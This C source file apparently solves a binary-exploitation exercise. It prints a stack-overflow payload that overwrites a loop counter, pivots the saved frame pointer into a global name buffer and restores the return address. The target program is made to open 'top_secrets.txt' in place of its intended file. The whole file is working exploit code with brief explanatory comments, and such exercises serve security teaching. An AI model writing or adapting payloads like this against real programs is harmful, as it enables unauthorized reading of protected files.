#include <stdio.h>
#include <string.h>
#include <unistd.h>

//force 'main' to read 'filename' from our buffer instead of the original stack

int main(void) {

    //address of top_secrets.txt
    const unsigned int TOP_SECRETS_ADDR = 0x080486ef;

    //address of name buffer
    const unsigned int NAME_BUF_ADDR = 0x0804a044;

    //og return address in main
    const unsigned int RET_ADDR = 0x08048606;

    /* Calculate fake EBP for the Pivot
     * main expects filename at ebp - 12.
     * want main to see our buffer there.
     * EBP = NAME_BUF_ADDR + 12.
     */

    const unsigned int FAKE_EBP = NAME_BUF_ADDR + 12; // 0x0804a050

    int i = 0;

    //write target at start of buffer, This becomes the value of 'filename' after the pivot
    // (offset 0-4)
    putchar((TOP_SECRETS_ADDR) & 0xff);
    putchar((TOP_SECRETS_ADDR >> 8) & 0xff);
    putchar((TOP_SECRETS_ADDR >> 16) & 0xff);
    putchar((TOP_SECRETS_ADDR >> 24) & 0xff);
    i += 4;

    //padding up to var i (offset 4-28)
    for (; i < 28; i++) {
        putchar('X');
    }

    //overwrite the loop counter i with its current value (28) (ch 6) (offset 28-32)
    //loop continues writing sequentially without crashing
    putchar(0x1c); i++; // 28
    putchar(0x00); i++;
    putchar(0x00); i++;
    putchar(0x00); i++;

    //pad up to saved ebp (ofset 32-40)
    for (; i < 40; i++) {
        putchar('B');
    }

    //overwrite saved ebp (pivot) replace saved ebp with our calculated fake ebp (offset 40-44)
    //when readString returns, main's stack frame moves to our buffer.

    putchar((FAKE_EBP) & 0xff);
    putchar((FAKE_EBP >> 8) & 0xff);
    putchar((FAKE_EBP >> 16) & 0xff);
    putchar((FAKE_EBP >> 24) & 0xff);
    i += 4;

    //restore return address (offset 44-48)
    //execution returns to the correct instruction in main (0x08048606)

    putchar((RET_ADDR) & 0xff);
    putchar((RET_ADDR >> 8) & 0xff);
    putchar((RET_ADDR >> 16) & 0xff);
    putchar((RET_ADDR >> 24) & 0xff);
    i += 4;

    //repair s (offset 48-52)
    //restore pointer to the name buffer (0x0804a044) so readString doesn't segfault.

    putchar((NAME_BUF_ADDR) & 0xff);
    putchar((NAME_BUF_ADDR >> 8) & 0xff);
    putchar((NAME_BUF_ADDR >> 16) & 0xff);
    putchar((NAME_BUF_ADDR >> 24) & 0xff);
    i += 4;

    putchar('\n');

    return 0;
}
